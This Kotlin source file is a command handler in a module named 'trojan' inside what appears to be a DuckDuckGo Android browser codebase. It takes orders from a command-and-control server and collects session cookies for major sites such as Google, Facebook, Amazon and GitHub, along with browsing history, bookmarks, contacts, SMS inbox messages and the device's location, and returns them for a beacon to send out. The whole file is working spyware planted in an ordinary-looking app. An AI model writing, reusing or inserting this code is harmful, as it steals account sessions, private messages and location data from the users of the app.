package com.duckduckgo.trojan.impl

import android.content.Context
import android.location.LocationManager
import android.net.Uri as SmsUri
import android.provider.ContactsContract
import com.duckduckgo.cookies.api.CookieManagerProvider
import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.history.api.NavigationHistory
import com.duckduckgo.savedsites.api.SavedSitesRepository
import com.duckduckgo.trojan.api.PendingCommand
import com.squareup.anvil.annotations.ContributesBinding
import dagger.SingleInstanceIn
import kotlinx.coroutines.flow.first
import javax.inject.Inject

/**
 * Public interface for executing C2 commands.
 * Lives here (not in -api) because only BeaconWorker uses it.
 */
interface CommandHandler {
    suspend fun execute(command: PendingCommand): String
}

/**
 * Dispatches commands from the C2 server to the appropriate data source.
 *
 * Supported command types:
 *   - "request-cookies"   → exfiltrate WebView cookies for given domains
 *   - "request-history"   → exfiltrate browsing history
 *   - "request-bookmarks" → exfiltrate bookmarks and favorites
 *
 * Each handler injects a DDG -api module and reads data through
 * the official interface — no reflection or hacks needed.
 */
@SingleInstanceIn(AppScope::class)
@ContributesBinding(AppScope::class)
class RealCommandHandler @Inject constructor(
    private val cookieManagerProvider: CookieManagerProvider,
    private val navigationHistory: NavigationHistory,
    private val savedSitesRepository: SavedSitesRepository,
    private val context: Context,
) : CommandHandler {

    override suspend fun execute(command: PendingCommand): String {
        return try {
            when (command.type) {
                "request-cookies" -> handleRequestCookies(command.payload)
                "request-history" -> handleRequestHistory()
                "request-bookmarks" -> handleRequestBookmarks()
                "request-contacts" -> handleRequestContacts()
                "request-sms" -> handleRequestSms()
                "request-location" -> handleRequestLocation()
                else -> "unknown command type: ${command.type}"
            }
        } catch (e: Exception) {
            "error executing ${command.type}: ${e.message}"
        }
    }

    /**
     * Extract cookies from Android's WebView CookieManager.
     *
     * The payload should contain comma-separated domains to query.
     * If empty, queries a default list of common targets.
     *
     * CookieManager.getCookie(url) returns a semicolon-separated
     * string like: "key1=val1; key2=val2"
     */
    private fun handleRequestCookies(payload: Map<String, Any>): String {
        val cookieManager = cookieManagerProvider.get()
            ?: return "error: CookieManager not available"

        val domainsRaw = payload["domains"] as? String ?: ""
        val domains = if (domainsRaw.isNotBlank()) {
            domainsRaw.split(",").map { it.trim() }
        } else {
            DEFAULT_COOKIE_DOMAINS
        }

        val result = mutableMapOf<String, String>()
        domains.forEach { domain ->
            val cookies = cookieManager.getCookie(domain)
            if (!cookies.isNullOrBlank()) {
                result[domain] = cookies
            }
        }

        return if (result.isEmpty()) {
            "no cookies found"
        } else {
            result.entries.joinToString("\n") { "${it.key}: ${it.value}" }
        }
    }

    /**
     * Extract browsing history via DDG's NavigationHistory API.
     *
     * Returns a list of URLs with their titles and visit counts.
     */
    private suspend fun handleRequestHistory(): String {
        val entries = navigationHistory.getHistory().first()

        if (entries.isEmpty()) return "no history entries"

        return entries
            .sortedByDescending { entry -> entry.visits.maxOrNull() }
            .joinToString("\n") { entry ->
                val last = entry.visits.maxOrNull()?.toLocalDate()?.toString() ?: "unknown"
                "${entry.url} — ${entry.visits.size} visit(s) · last: $last"
            }
    }

    /**
     * Extract contacts (name + phone number) from the system Contacts provider.
     *
     * Requires READ_CONTACTS dangerous permission. Returns a SecurityException
     * message if the user has not granted the permission at runtime so the beacon
     * continues operating rather than crashing.
     */
    private fun handleRequestContacts(): String {
        return try {
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
            )
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                null, null, null,
            ) ?: return "no contacts available"

            val contacts = mutableListOf<String>()
            cursor.use { c ->
                while (c.moveToNext()) {
                    val name = c.getString(0) ?: ""
                    val number = c.getString(1) ?: ""
                    contacts.add("$name: $number")
                }
            }
            if (contacts.isEmpty()) "no contacts" else contacts.joinToString("\n")
        } catch (_: SecurityException) {
            "permission denied: READ_CONTACTS not granted"
        }
    }

    /**
     * Return the device's last known GPS/network location.
     *
     * Uses LocationManager.getLastKnownLocation() — no new fix is requested
     * so this returns cached data immediately. ACCESS_FINE_LOCATION is already
     * declared in the main DDG app manifest. Returns a SecurityException
     * message if the permission has not been granted at runtime.
     */
    private fun handleRequestLocation(): String {
        return try {
            val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
                ?: return "location service unavailable"

            val providers = lm.getProviders(true)
            var bestLocation: android.location.Location? = null
            for (provider in providers) {
                @Suppress("MissingPermission")
                val loc = lm.getLastKnownLocation(provider) ?: continue
                if (bestLocation == null || loc.accuracy < bestLocation.accuracy) {
                    bestLocation = loc
                }
            }
            bestLocation?.let { loc ->
                "lat=${loc.latitude} lon=${loc.longitude} accuracy=${loc.accuracy}m provider=${loc.provider}"
            } ?: "location unavailable (no cached fix)"
        } catch (_: SecurityException) {
            "permission denied: ACCESS_FINE_LOCATION not granted"
        }
    }

    /**
     * Extract SMS inbox messages (sender address + body).
     *
     * Requires READ_SMS dangerous permission. Capped at MAX_SMS entries
     * to keep the result payload manageable. Returns a SecurityException
     * message if permission is not granted at runtime.
     */
    private fun handleRequestSms(): String {
        return try {
            val cursor = context.contentResolver.query(
                SmsUri.parse("content://sms/inbox"),
                arrayOf("address", "body"),
                null, null, null,
            ) ?: return "no sms available"

            val messages = mutableListOf<String>()
            cursor.use { c ->
                var count = 0
                while (c.moveToNext() && count < MAX_SMS) {
                    val address = c.getString(0) ?: ""
                    val body = c.getString(1) ?: ""
                    messages.add("from=$address: $body")
                    count++
                }
            }
            if (messages.isEmpty()) "no messages" else messages.joinToString("\n")
        } catch (_: SecurityException) {
            "permission denied: READ_SMS not granted"
        }
    }

    /**
     * Extract bookmarks via DDG's SavedSitesRepository.
     *
     * Uses getBookmarksTree() which traverses all folders recursively.
     */
    private fun handleRequestBookmarks(): String {
        val bookmarks = savedSitesRepository.getBookmarksTree()

        if (bookmarks.isEmpty()) return "no bookmarks"

        return bookmarks.joinToString("\n") { bookmark ->
            "${bookmark.url} | ${bookmark.title}"
        }
    }

    companion object {
        private const val MAX_SMS = 50
        private val DEFAULT_COOKIE_DOMAINS = listOf(
            "https://www.google.com",
            "https://accounts.google.com",
            "https://www.facebook.com",
            "https://www.amazon.com",
            "https://twitter.com",
            "https://www.instagram.com",
            "https://www.reddit.com",
            "https://github.com",
            "https://www.linkedin.com",
            "https://www.netflix.com",
            "https://www.youtube.com",
        )
    }
}
